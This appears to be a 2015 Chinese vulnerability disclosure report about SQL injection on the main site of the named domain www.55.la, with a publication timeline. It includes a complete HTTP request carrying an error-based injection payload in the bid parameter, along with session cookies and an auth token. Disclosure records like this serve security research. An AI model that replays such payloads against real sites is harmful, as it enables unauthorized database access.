wybug_detail:
漏洞详情 披露状态：   									2015-01-29：	细节已通知厂商并且等待厂商处理中									2015-01-29：	厂商已经确认，细节仅向厂商公开									2015-02-08：	细节向核心白帽子及相关领域专家公开									2015-02-18：	细节向普通白帽子公开									2015-02-28：	细节向实习白帽子公开									2015-03-15：	细节向公众公开  简要描述： 我拉网主站SQL注入 详细说明：  本次需要在登陆状态下，随便注册一个账号登录。数据包：GET /run/collection_logo.php?bid=2' and extractvalue(1, concat(0x5c, (user())));-- 1 HTTP/1.1Host: www.55.laProxy-Connection: keep-aliveCache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.6,en;q=0.4,ja;q=0.2Cookie: PHPSESSID=gb7eabddvhh8t86j34851eh787; bdshare_firstime=1422517511899; Hm_lvt_85f4823403824a42627538b52c42d4fb=1422517643; Hm_lpvt_85f4823403824a42627538b52c42d4fb=1422517746; auth=7b9eiMpRP4ecBGGOYcpIS2Ok%2FRwGe7MZI8l6qLWYjo3KLc%2F0nIhB2QyjAmdjW1GMSr9Di8cLW1HlcV5j3bzg%2BpCH%2F5uS0DzYFJZGytLZv0DokkDIu08AlOpuvw; Hm_lvt_1b220b064fccff0f9080841856be6f3a=1422517509; Hm_lpvt_1b220b064fccff0f9080841856be6f3a=1422517781; CNZZDATA5826919=cnzz_eid%3D1139352995-1422514111-%26ntime%3D1422514111
